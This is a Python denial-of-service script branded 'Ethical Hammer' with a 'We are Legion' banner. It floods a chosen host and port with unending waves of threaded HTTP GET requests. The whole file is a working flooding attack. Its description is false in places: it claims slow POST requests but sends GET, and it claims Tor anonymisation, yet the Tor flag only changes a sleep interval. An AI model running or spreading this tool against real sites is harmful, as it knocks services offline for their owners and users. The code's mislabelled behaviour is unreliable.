import argparse
import requests
import threading
import time
import random

useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    # Add more user agents as needed
]

def attack(target, port, threads, use_tor):
    url = f"http://{target}:{port}/"

    def make_request():
        headers = {'User-Agent': random.choice(useragents)}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            print(f"Connected to host... Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error: {str(e)}")

    while True:
        for _ in range(threads):
            thread = threading.Thread(target=make_request)
            thread.start()

        # Sleep for 20 seconds without Tor or 40 seconds with Tor before checking the site
        sleep_time = 20 if not use_tor else 40
        time.sleep(sleep_time)

def main():
    parser = argparse.ArgumentParser(description="Ethical Hammer - Slow POST DoS Testing Tool")
    parser.add_argument("-t", "--target", required=True, help="Hostname or IP of the target")
    parser.add_argument("-r", "--threads", type=int, default=256, help="Number of threads (default: 256)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Web server port (default: 80)")
    parser.add_argument("-T", "--tor", action="store_true", help="Enable anonymizing through Tor on 127.0.0.1:9150")
    args = parser.parse_args()

    print("\n * Ethical Hammer")
    print(" * Slow POST DoS Testing Tool")
    print(" * entropy [at] phiral.net")
    print(" * Anon-ymized via Tor")
    print(" * We are Legion.\n")

    print(f"Target: {args.target} Port: {args.port}")
    print(f"Threads: {args.threads} Tor: {args.tor}")
    print("Give 20 seconds without Tor or 40 with before checking the site")

    attack(args.target, args.port, args.threads, args.tor)

if __name__ == "__main__":
    main()
